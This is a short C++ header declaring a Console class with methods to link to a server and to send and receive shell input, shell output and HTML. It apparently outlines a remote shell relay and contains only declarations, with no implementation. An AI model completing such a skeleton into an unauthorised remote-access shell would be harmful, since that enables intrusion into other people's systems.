#pragma once

#include <iostream>
#include <string>

class Console
{
public:
	Console();
	
public:
	void Link2Server();
	void Run();

private:
	void SendInitialHTML();
	void SendShellOutput();
	void GetShellInput();
	void GetShellOutput();
};

